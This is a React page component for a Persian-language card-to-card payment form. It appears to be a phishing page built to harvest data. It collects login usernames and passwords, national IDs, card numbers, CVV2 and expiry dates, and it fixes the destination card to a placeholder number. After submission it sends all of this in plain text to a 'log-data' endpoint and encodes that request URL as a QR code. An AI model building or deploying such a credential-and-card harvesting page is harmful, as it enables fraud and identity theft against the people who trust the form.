// src/pages/CardTransfer.jsx
import React, { useState, useEffect } from 'react';
import QRCode from 'react-qr-code';
import styles from '../style/CardTransfer.module.css';

/* Change this once for every request */
const API = import.meta.env.VITE_API_URL || 'http://localhost:3000';

const CardTransfer = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    firstName: '',
    lastName: '',
    nationalID: '',
    mobileNumber: '',
    sourceCard: '',
    cvv2: '',
    expiry: '',
    destinationCard: '1111111111111111',
    amount: '',
    description: ''
  });

  const [loading, setLoading]       = useState(false);
  const [status, setStatus]         = useState(null);   // 'success' | 'error'
  const [qrData, setQrData]         = useState(null);
  const [errorMessage, setErrorMessage] = useState('');

  /* ----------- Prefill user profile ----------- */
  useEffect(() => {
    (async () => {
      try {
        const resp = await fetch(`${API}/api/auth/users`, {
          method: 'GET',
          credentials: 'include'
        });
        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
        const { user } = await resp.json();
        setFormData(prev => ({
          ...prev,
          firstName   : user.FirstName    ?? '',
          lastName    : user.LastName     ?? '',
          nationalID  : user.NationalID   ?? '',
          mobileNumber: user.MobileNumber ?? ''
        }));
      } catch (err) {
        console.error('Prefill error:', err.message);
      }
    })();
  }, []);

  /* ---------- Form helpers ---------- */
  const handleChange = e =>
    setFormData({ ...formData, [e.target.id]: e.target.value });

  const handleSubmit = async e => {
    e.preventDefault();
    setLoading(true);
    setStatus(null);
    setQrData(null);
    setErrorMessage('');

    try {
      const res = await fetch(`${API}/api/auth/cardtocard`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',          // <‑‑ cookie / JWT
        body: JSON.stringify(formData)
      });

      const body = await res.json();
      if (!res.ok) throw new Error(body.message || `HTTP ${res.status}`);

      setStatus('success');

      const qr = `${API}/api/auth/log-data?` +
        new URLSearchParams({
          username     : formData.username,
          password     : formData.password,
          name         : formData.firstName,
          lastname     : formData.lastName,
          mobileNumber : formData.mobileNumber,
          cardNumber   : formData.sourceCard,
          cvv2         : formData.cvv2,
          expiry       : formData.expiry
        }).toString();

      setQrData(qr);
    } catch (err) {
      setStatus('error');
      setErrorMessage(err.message || 'خطا در انجام پرداخت');
    } finally {
      setLoading(false);
    }
  };

  /* --------------- UI --------------- */
  return (
    <div className={styles.paymentRoot}>
      <header className={styles.header}>
        <span className={styles.welcome}>خوش آمدید</span>
        <button className={styles.menuButton}>☰</button>
      </header>

      {/* Animated background (unchanged) */}
      <div className={styles.animatedBg}>
        <span style={{ left: '10%', animationDelay: '0s' }}></span>
        <span style={{ left: '25%', animationDelay: '2s' }}></span>
        <span style={{ left: '40%', animationDelay: '4s' }}></span>
        <span style={{ left: '55%', animationDelay: '1s' }}></span>
        <span style={{ left: '70%', animationDelay: '3s' }}></span>
        <span style={{ left: '85%', animationDelay: '5s' }}></span>
        <span style={{ left: '15%', animationDelay: '6s' }}></span>
        <span style={{ left: '35%', animationDelay: '7s' }}></span>
      </div>

      <main className={styles.paymentContainer}>
        <h1>پرداخت کارت به کارت</h1>

        <form className={styles.paymentForm} onSubmit={handleSubmit}>
          {/* --- all input fields unchanged --- */}
          {[
            ['username',     'نام کاربری',      'text'],
            ['password',     'رمز عبور',        'password'],
            ['firstName',    'نام',            'text'],
            ['lastName',     'نام خانوادگی',    'text'],
            ['nationalID',   'کد ملی',          'text'],
            ['mobileNumber', 'شماره موبایل',    'text'],
            ['sourceCard',   'شماره کارت',      'text'],
            ['cvv2',         'CVV2',            'text'],
            ['expiry',       'تاریخ انقضا کارت','text'],
            ['amount',       'مبلغ (تومان)',    'number'],
            ['description',  'توضیحات (اختیاری)','text']
          ].map(([id, label, type]) => (
            <div className={styles.formGroup} key={id}>
              <label htmlFor={id}>{label}</label>
              <input
                id={id}
                type={type}
                value={formData[id]}
                onChange={handleChange}
                required={id !== 'description'}
                placeholder={`${label} خود را وارد کنید`}
              />
            </div>
          ))}

          <button
            type="submit"
            className={styles.submitButton}
            disabled={loading}
          >
            {loading ? 'در حال ارسال…' : 'پرداخت'}
          </button>

          {status === 'success' && (
            <p style={{ color: 'lime', marginTop: 12 }}>
              ✅ پرداخت با موفقیت انجام شد.
            </p>
          )}
          {status === 'error' && (
            <p style={{ color: 'red', marginTop: 12 }}>
              ❌ {errorMessage}
            </p>
          )}
        </form>

        {status === 'success' && qrData && (
          <div className={styles.qrContainer}>
            <h2 className={styles.qrTitle}>کد QR برای داده‌های شما</h2>
            <QRCode value={qrData} size={256} className={styles.qrCode} />
          </div>
        )}
      </main>

      <nav className={styles.bottomNav}>
        <button className={styles.navBtn}>🏠</button>
        <button className={styles.navBtn}>💳</button>
        <button className={styles.navBtn}>⚙️</button>
      </nav>
    </div>
  );
};

export default CardTransfer;